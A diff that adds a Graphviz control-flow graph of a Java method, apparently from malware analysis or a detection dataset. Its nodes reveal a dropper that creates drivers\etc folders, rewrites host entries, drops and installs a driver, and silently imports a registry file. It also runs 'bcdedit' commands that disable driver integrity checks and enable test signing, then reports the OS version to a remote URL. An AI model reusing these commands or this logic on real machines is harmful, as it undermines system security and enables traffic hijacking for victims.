@@ -1,0 +1,305 @@
+digraph "" {
+    "r0 := @this: le"
+    "push \"os.name\""
+    "r0 := @this: le"->"push \"os.name\"";
+    "staticinvoke <java.lang.System: java.lang.String getProperty(java.lang.String)>"
+    "push \"os.name\""->"staticinvoke <java.lang.System: java.lang.String getProperty(java.lang.String)>";
+    "virtualinvoke <java.lang.String: java.lang.String toLowerCase()>"
+    "staticinvoke <java.lang.System: java.lang.String getProperty(java.lang.String)>"->"virtualinvoke <java.lang.String: java.lang.String toLowerCase()>";
+    "push \"windows\""
+    "virtualinvoke <java.lang.String: java.lang.String toLowerCase()>"->"push \"windows\"";
+    "virtualinvoke <java.lang.String: int indexOf(java.lang.String)>"
+    "push \"windows\""->"virtualinvoke <java.lang.String: int indexOf(java.lang.String)>";
+    "push -1"
+    "virtualinvoke <java.lang.String: int indexOf(java.lang.String)>"->"push -1";
+    "ifcmple.i return"
+    "push -1"->"ifcmple.i return";
+    "new java.io.File"
+    "ifcmple.i return"->"new java.io.File";
+    "dup1.r"
+    "new java.io.File"->"dup1.r";
+    "load.r r0"
+    "dup1.r"->"load.r r0";
+    "fieldget <le: java.lang.String C_LIX>"
+    "load.r r0"->"fieldget <le: java.lang.String C_LIX>";
+    "specialinvoke <java.io.File: void <init>(java.lang.String)>"
+    "fieldget <le: java.lang.String C_LIX>"->"specialinvoke <java.io.File: void <init>(java.lang.String)>";
+    "virtualinvoke <java.io.File: boolean exists()>"
+    "specialinvoke <java.io.File: void <init>(java.lang.String)>"->"virtualinvoke <java.io.File: boolean exists()>";
+    "ifne return"
+    "virtualinvoke <java.io.File: boolean exists()>"->"ifne return";
+    "ifne return"->"load.r r0";
+    "fieldget <le: java.lang.String TEMPO>"
+    "load.r r0"->"fieldget <le: java.lang.String TEMPO>";
+    "push \"/\""
+    "fieldget <le: java.lang.String TEMPO>"->"push \"/\"";
+    "virtualinvoke <java.lang.String: boolean endsWith(java.lang.String)>"
+    "push \"/\""->"virtualinvoke <java.lang.String: boolean endsWith(java.lang.String)>";
+    "ifne push 1"
+    "virtualinvoke <java.lang.String: boolean endsWith(java.lang.String)>"->"ifne push 1";
+    "ifne push 1"->"load.r r0";
+    "load.r r0"->"fieldget <le: java.lang.String TEMPO>";
+    "push \"\\\\""
+    "fieldget <le: java.lang.String TEMPO>"->"push \"\\\\"";
+    "push \"\\\\""->"virtualinvoke <java.lang.String: boolean endsWith(java.lang.String)>";
+    "virtualinvoke <java.lang.String: boolean endsWith(java.lang.String)>"->"ifne push 1";
+    "ifne push 1"->"load.r r0";
+    "new java.lang.StringBuilder"
+    "load.r r0"->"new java.lang.StringBuilder";
+    "new java.lang.StringBuilder"->"dup1.r";
+    "dup1.r"->"load.r r0";
+    "load.r r0"->"fieldget <le: java.lang.String TEMPO>";
+    "staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>"
+    "fieldget <le: java.lang.String TEMPO>"->"staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>";
+    "specialinvoke <java.lang.StringBuilder: void <init>(java.lang.String)>"
+    "staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>"->"specialinvoke <java.lang.StringBuilder: void <init>(java.lang.String)>";
+    "specialinvoke <java.lang.StringBuilder: void <init>(java.lang.String)>"->"load.r r0";
+    "fieldget <le: java.lang.String BARRA>"
+    "load.r r0"->"fieldget <le: java.lang.String BARRA>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"
+    "fieldget <le: java.lang.String BARRA>"->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>";
+    "fieldput <le: java.lang.String TEMPO>"
+    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"->"fieldput <le: java.lang.String TEMPO>";
+    "push 1"
+    "fieldput <le: java.lang.String TEMPO>"->"push 1";
+    "staticinvoke <le: void Pausar(int)>"
+    "push 1"->"staticinvoke <le: void Pausar(int)>";
+    "staticinvoke <le: void Pausar(int)>"->"load.r r0";
+    "push \"cmd /c mkdir c:\\windows\\syswow64\\drivers\\etc\""
+    "load.r r0"->"push \"cmd /c mkdir c:\\windows\\syswow64\\drivers\\etc\"";
+    "virtualinvoke <le: void H32B(java.lang.String)>"
+    "push \"cmd /c mkdir c:\\windows\\syswow64\\drivers\\etc\""->"virtualinvoke <le: void H32B(java.lang.String)>";
+    "virtualinvoke <le: void H32B(java.lang.String)>"->"push 1";
+    "push 1"->"staticinvoke <le: void Pausar(int)>";
+    "staticinvoke <le: void Pausar(int)>"->"load.r r0";
+    "load.r r0"->"load.r r0";
+    "fieldget <le: java.lang.String IP_PH1>"
+    "load.r r0"->"fieldget <le: java.lang.String IP_PH1>";
+    "fieldget <le: java.lang.String IP_PH1>"->"load.r r0";
+    "fieldget <le: java.lang.String bb>"
+    "load.r r0"->"fieldget <le: java.lang.String bb>";
+    "virtualinvoke <le: void H32C(java.lang.String,java.lang.String)>"
+    "fieldget <le: java.lang.String bb>"->"virtualinvoke <le: void H32C(java.lang.String,java.lang.String)>";
+    "virtualinvoke <le: void H32C(java.lang.String,java.lang.String)>"->"load.r r0";
+    "load.r r0"->"load.r r0";
+    "fieldget <le: java.lang.String IP_PH2>"
+    "load.r r0"->"fieldget <le: java.lang.String IP_PH2>";
+    "fieldget <le: java.lang.String IP_PH2>"->"load.r r0";
+    "fieldget <le: java.lang.String gf>"
+    "load.r r0"->"fieldget <le: java.lang.String gf>";
+    "fieldget <le: java.lang.String gf>"->"virtualinvoke <le: void H32C(java.lang.String,java.lang.String)>";
+    "virtualinvoke <le: void H32C(java.lang.String,java.lang.String)>"->"load.r r0";
+    "load.r r0"->"load.r r0";
+    "fieldget <le: java.lang.String IP_PH3>"
+    "load.r r0"->"fieldget <le: java.lang.String IP_PH3>";
+    "fieldget <le: java.lang.String IP_PH3>"->"load.r r0";
+    "fieldget <le: java.lang.String san>"
+    "load.r r0"->"fieldget <le: java.lang.String san>";
+    "fieldget <le: java.lang.String san>"->"virtualinvoke <le: void H32C(java.lang.String,java.lang.String)>";
+    "virtualinvoke <le: void H32C(java.lang.String,java.lang.String)>"->"push 1";
+    "push 1"->"staticinvoke <le: void Pausar(int)>";
+    "staticinvoke <le: void Pausar(int)>"->"load.r r0";
+    "load.r r0"->"load.r r0";
+    "fieldget <le: java.lang.String C_HOST>"
+    "load.r r0"->"fieldget <le: java.lang.String C_HOST>";
+    "fieldget <le: java.lang.String C_HOST>"->"load.r r0";
+    "fieldget <le: java.lang.String ST_HOST>"
+    "load.r r0"->"fieldget <le: java.lang.String ST_HOST>";
+    "virtualinvoke <le: void H31S(java.lang.String,java.lang.String)>"
+    "fieldget <le: java.lang.String ST_HOST>"->"virtualinvoke <le: void H31S(java.lang.String,java.lang.String)>";
+    "virtualinvoke <le: void H31S(java.lang.String,java.lang.String)>"->"load.r r0";
+    "load.r r0"->"load.r r0";
+    "fieldget <le: java.lang.String C_JAVA>"
+    "load.r r0"->"fieldget <le: java.lang.String C_JAVA>";
+    "fieldget <le: java.lang.String C_JAVA>"->"load.r r0";
+    "fieldget <le: java.lang.String ST_JAVA>"
+    "load.r r0"->"fieldget <le: java.lang.String ST_JAVA>";
+    "fieldget <le: java.lang.String ST_JAVA>"->"virtualinvoke <le: void H31S(java.lang.String,java.lang.String)>";
+    "virtualinvoke <le: void H31S(java.lang.String,java.lang.String)>"->"load.r r0";
+    "load.r r0"->"load.r r0";
+    "fieldget <le: java.lang.String N_ZIP>"
+    "load.r r0"->"fieldget <le: java.lang.String N_ZIP>";
+    "fieldget <le: java.lang.String N_ZIP>"->"new java.lang.StringBuilder";
+    "new java.lang.StringBuilder"->"dup1.r";
+    "dup1.r"->"load.r r0";
+    "load.r r0"->"fieldget <le: java.lang.String TEMPO>";
+    "fieldget <le: java.lang.String TEMPO>"->"staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>";
+    "staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>"->"specialinvoke <java.lang.StringBuilder: void <init>(java.lang.String)>";
+    "specialinvoke <java.lang.StringBuilder: void <init>(java.lang.String)>"->"load.r r0";
+    "fieldget <le: java.lang.String X_ZIP>"
+    "load.r r0"->"fieldget <le: java.lang.String X_ZIP>";
+    "fieldget <le: java.lang.String X_ZIP>"->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>";
+    "virtualinvoke <le: void H24D(java.lang.String,java.lang.String)>"
+    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"->"virtualinvoke <le: void H24D(java.lang.String,java.lang.String)>";
+    "virtualinvoke <le: void H24D(java.lang.String,java.lang.String)>"->"push 1";
+    "push 1"->"staticinvoke <le: void Pausar(int)>";
+    "staticinvoke <le: void Pausar(int)>"->"load.r r0";
+    "load.r r0"->"load.r r0";
+    "load.r r0"->"fieldget <le: java.lang.String X_ZIP>";
+    "virtualinvoke <le: void H24Z(java.lang.String)>"
+    "fieldget <le: java.lang.String X_ZIP>"->"virtualinvoke <le: void H24Z(java.lang.String)>";
+    "virtualinvoke <le: void H24Z(java.lang.String)>"->"push 1";
+    "push 1"->"staticinvoke <le: void Pausar(int)>";
+    "staticinvoke <le: void Pausar(int)>"->"load.r r0";
+    "virtualinvoke <le: void FFexists()>"
+    "load.r r0"->"virtualinvoke <le: void FFexists()>";
+    "virtualinvoke <le: void FFexists()>"->"push 1";
+    "push 1"->"staticinvoke <le: void Pausar(int)>";
+    "staticinvoke <le: boolean b64()>"
+    "staticinvoke <le: void Pausar(int)>"->"staticinvoke <le: boolean b64()>";
+    "ifne new java.lang.StringBuilder"
+    "staticinvoke <le: boolean b64()>"->"ifne new java.lang.StringBuilder";
+    "ifne new java.lang.StringBuilder"->"new java.lang.StringBuilder";
+    "new java.lang.StringBuilder"->"dup1.r";
+    "dup1.r"->"load.r r0";
+    "load.r r0"->"fieldget <le: java.lang.String TEMPO>";
+    "fieldget <le: java.lang.String TEMPO>"->"staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>";
+    "staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>"->"specialinvoke <java.lang.StringBuilder: void <init>(java.lang.String)>";
+    "specialinvoke <java.lang.StringBuilder: void <init>(java.lang.String)>"->"load.r r0";
+    "fieldget <le: java.lang.String VSYS1>"
+    "load.r r0"->"fieldget <le: java.lang.String VSYS1>";
+    "fieldget <le: java.lang.String VSYS1>"->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"->"load.r r0";
+    "fieldget <le: java.lang.String C_SYS>"
+    "load.r r0"->"fieldget <le: java.lang.String C_SYS>";
+    "staticinvoke <le: void H32F(java.lang.String,java.lang.String)>"
+    "fieldget <le: java.lang.String C_SYS>"->"staticinvoke <le: void H32F(java.lang.String,java.lang.String)>";
+    "goto push 1"
+    "staticinvoke <le: void H32F(java.lang.String,java.lang.String)>"->"goto push 1";
+    "goto push 1"->"push 1";
+    "push 1"->"staticinvoke <le: void Pausar(int)>";
+    "staticinvoke <le: void Pausar(int)>"->"staticinvoke <le: boolean b64()>";
+    "ifne load.r r0"
+    "staticinvoke <le: boolean b64()>"->"ifne load.r r0";
+    "ifne load.r r0"->"load.r r0";
+    "push \"cmd /c %tmp%\\bcdedit.exe -set loadoptions DDISABLE_INTEGRITY_CHECKS\""
+    "load.r r0"->"push \"cmd /c %tmp%\\bcdedit.exe -set loadoptions DDISABLE_INTEGRITY_CHECKS\"";
+    "push \"cmd /c %tmp%\\bcdedit.exe -set loadoptions DDISABLE_INTEGRITY_CHECKS\""->"virtualinvoke <le: void H32B(java.lang.String)>";
+    "virtualinvoke <le: void H32B(java.lang.String)>"->"load.r r0";
+    "push \"cmd /c %tmp%\\bcdedit.exe -set TESTSIGNING ON\""
+    "load.r r0"->"push \"cmd /c %tmp%\\bcdedit.exe -set TESTSIGNING ON\"";
+    "push \"cmd /c %tmp%\\bcdedit.exe -set TESTSIGNING ON\""->"virtualinvoke <le: void H32B(java.lang.String)>";
+    "virtualinvoke <le: void H32B(java.lang.String)>"->"load.r r0";
+    "load.r r0"->"load.r r0";
+    "fieldget <le: java.lang.String CMS1>"
+    "load.r r0"->"fieldget <le: java.lang.String CMS1>";
+    "fieldget <le: java.lang.String CMS1>"->"virtualinvoke <le: void H32B(java.lang.String)>";
+    "push 2"
+    "virtualinvoke <le: void H32B(java.lang.String)>"->"push 2";
+    "push 2"->"staticinvoke <le: void Pausar(int)>";
+    "staticinvoke <le: void Pausar(int)>"->"load.r r0";
+    "load.r r0"->"load.r r0";
+    "fieldget <le: java.lang.String CMSS1>"
+    "load.r r0"->"fieldget <le: java.lang.String CMSS1>";
+    "fieldget <le: java.lang.String CMSS1>"->"virtualinvoke <le: void H32B(java.lang.String)>";
+    "goto load.r r0"
+    "virtualinvoke <le: void H32B(java.lang.String)>"->"goto load.r r0";
+    "goto load.r r0"->"load.r r0";
+    "load.r r0"->"new java.lang.StringBuilder";
+    "new java.lang.StringBuilder"->"dup1.r";
+    "push \"cmd /c regedit /s \""
+    "dup1.r"->"push \"cmd /c regedit /s \"";
+    "push \"cmd /c regedit /s \""->"specialinvoke <java.lang.StringBuilder: void <init>(java.lang.String)>";
+    "specialinvoke <java.lang.StringBuilder: void <init>(java.lang.String)>"->"load.r r0";
+    "load.r r0"->"fieldget <le: java.lang.String TEMPO>";
+    "fieldget <le: java.lang.String TEMPO>"->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "push \"add.reg\""
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"push \"add.reg\"";
+    "push \"add.reg\""->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"->"virtualinvoke <le: void H32B(java.lang.String)>";
+    "virtualinvoke <le: void H32B(java.lang.String)>"->"load.r r0";
+    "fieldget <le: java.lang.String s8>"
+    "load.r r0"->"fieldget <le: java.lang.String s8>";
+    "fieldget <le: java.lang.String s8>"->"staticinvoke <java.lang.System: java.lang.String getProperty(java.lang.String)>";
+    "store.r r2"
+    "staticinvoke <java.lang.System: java.lang.String getProperty(java.lang.String)>"->"store.r r2";
+    "push \"Windows (.*)\""
+    "store.r r2"->"push \"Windows (.*)\"";
+    "staticinvoke <java.util.regex.Pattern: java.util.regex.Pattern compile(java.lang.String)>"
+    "push \"Windows (.*)\""->"staticinvoke <java.util.regex.Pattern: java.util.regex.Pattern compile(java.lang.String)>";
+    "load.r r2"
+    "staticinvoke <java.util.regex.Pattern: java.util.regex.Pattern compile(java.lang.String)>"->"load.r r2";
+    "virtualinvoke <java.util.regex.Pattern: java.util.regex.Matcher matcher(java.lang.CharSequence)>"
+    "load.r r2"->"virtualinvoke <java.util.regex.Pattern: java.util.regex.Matcher matcher(java.lang.CharSequence)>";
+    "virtualinvoke <java.util.regex.Pattern: java.util.regex.Matcher matcher(java.lang.CharSequence)>"->"store.r r2";
+    "store.r r2"->"load.r r2";
+    "virtualinvoke <java.util.regex.Matcher: boolean find()>"
+    "load.r r2"->"virtualinvoke <java.util.regex.Matcher: boolean find()>";
+    "ifeq return"
+    "virtualinvoke <java.util.regex.Matcher: boolean find()>"->"ifeq return";
+    "ifeq return"->"load.r r0";
+    "load.r r0"->"load.r r2";
+    "load.r r2"->"push 1";
+    "virtualinvoke <java.util.regex.Matcher: java.lang.String group(int)>"
+    "push 1"->"virtualinvoke <java.util.regex.Matcher: java.lang.String group(int)>";
+    "virtualinvoke <java.util.regex.Matcher: java.lang.String group(int)>"->"store.r r2";
+    "store.r r2"->"new java.lang.StringBuilder";
+    "new java.lang.StringBuilder"->"dup1.r";
+    "push \"Windows\""
+    "dup1.r"->"push \"Windows\"";
+    "push \"Windows\""->"specialinvoke <java.lang.StringBuilder: void <init>(java.lang.String)>";
+    "specialinvoke <java.lang.StringBuilder: void <init>(java.lang.String)>"->"load.r r2";
+    "load.r r2"->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"->"store.r r2";
+    "store.r r2"->"new java.lang.StringBuilder";
+    "new java.lang.StringBuilder"->"dup1.r";
+    "dup1.r"->"load.r r0";
+    "fieldget <le: java.lang.String URLX1>"
+    "load.r r0"->"fieldget <le: java.lang.String URLX1>";
+    "fieldget <le: java.lang.String URLX1>"->"staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>";
+    "staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>"->"specialinvoke <java.lang.StringBuilder: void <init>(java.lang.String)>";
+    "specialinvoke <java.lang.StringBuilder: void <init>(java.lang.String)>"->"load.r r2";
+    "load.r r2"->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "push \"&estrutura=\""
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"push \"&estrutura=\"";
+    "push \"&estrutura=\""->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"staticinvoke <le: boolean b64()>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(boolean)>"
+    "staticinvoke <le: boolean b64()>"->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(boolean)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(boolean)>"->"virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"->"load.r r0";
+    "load.r r0"->"fieldget <le: java.lang.String C_LIX>";
+    "virtualinvoke <le: void H32A(java.lang.String,java.lang.String)>"
+    "fieldget <le: java.lang.String C_LIX>"->"virtualinvoke <le: void H32A(java.lang.String,java.lang.String)>";
+    "return"
+    "virtualinvoke <le: void H32A(java.lang.String,java.lang.String)>"->"return";
+    "ifne load.r r0"->"load.r r0";
+    "load.r r0"->"push \"cmd /c %tmp%\\bcdedit.exe -set loadoptions DDISABLE_INTEGRITY_CHECKS\"";
+    "push \"cmd /c %tmp%\\bcdedit.exe -set loadoptions DDISABLE_INTEGRITY_CHECKS\""->"virtualinvoke <le: void H32B(java.lang.String)>";
+    "virtualinvoke <le: void H32B(java.lang.String)>"->"load.r r0";
+    "load.r r0"->"push \"cmd /c %tmp%\\bcdedit.exe -set TESTSIGNING ON\"";
+    "push \"cmd /c %tmp%\\bcdedit.exe -set TESTSIGNING ON\""->"virtualinvoke <le: void H32B(java.lang.String)>";
+    "virtualinvoke <le: void H32B(java.lang.String)>"->"load.r r0";
+    "load.r r0"->"load.r r0";
+    "fieldget <le: java.lang.String CMS164>"
+    "load.r r0"->"fieldget <le: java.lang.String CMS164>";
+    "fieldget <le: java.lang.String CMS164>"->"virtualinvoke <le: void H32B(java.lang.String)>";
+    "virtualinvoke <le: void H32B(java.lang.String)>"->"push 2";
+    "push 2"->"staticinvoke <le: void Pausar(int)>";
+    "staticinvoke <le: void Pausar(int)>"->"load.r r0";
+    "load.r r0"->"load.r r0";
+    "fieldget <le: java.lang.String CMSS164>"
+    "load.r r0"->"fieldget <le: java.lang.String CMSS164>";
+    "fieldget <le: java.lang.String CMSS164>"->"virtualinvoke <le: void H32B(java.lang.String)>";
+    "ifne new java.lang.StringBuilder"->"new java.lang.StringBuilder";
+    "new java.lang.StringBuilder"->"dup1.r";
+    "dup1.r"->"load.r r0";
+    "load.r r0"->"fieldget <le: java.lang.String TEMPO>";
+    "fieldget <le: java.lang.String TEMPO>"->"staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>";
+    "staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>"->"specialinvoke <java.lang.StringBuilder: void <init>(java.lang.String)>";
+    "specialinvoke <java.lang.StringBuilder: void <init>(java.lang.String)>"->"load.r r0";
+    "fieldget <le: java.lang.String VSYS164>"
+    "load.r r0"->"fieldget <le: java.lang.String VSYS164>";
+    "fieldget <le: java.lang.String VSYS164>"->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"->"load.r r0";
+    "fieldget <le: java.lang.String C_SYS64>"
+    "load.r r0"->"fieldget <le: java.lang.String C_SYS64>";
+    "fieldget <le: java.lang.String C_SYS64>"->"staticinvoke <le: void H32F(java.lang.String,java.lang.String)>";
+}
